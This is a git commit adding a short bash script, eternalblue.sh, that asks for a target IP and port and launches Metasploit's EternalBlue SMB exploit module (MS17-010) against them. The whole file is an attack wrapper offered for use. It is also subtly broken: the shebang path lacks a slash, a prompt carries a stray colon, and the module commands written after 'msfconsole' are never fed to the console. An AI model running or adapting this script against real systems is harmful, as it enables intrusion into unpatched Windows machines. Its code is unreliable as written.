0e23b7fe4efa9981aba14c2f3f315744d742d2bc
Dima-diep <52601543+Dima-diep@users.noreply.github.com>
2021-04-29 15:42:51 +0300

    eternalblue.sh

---
+++ eternalblue.sh
@@ -0,0 +1,10 @@
+﻿#!bin/bash
+echo "Starting Metasploit Framework..."
+echo "Starting Eternalblue exploit module..."
+read -p 'Target IP: ' ipvar
+read -p 'Target Port: ': portvar
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST $ipvar
+set RPORT $portvar
+exploit
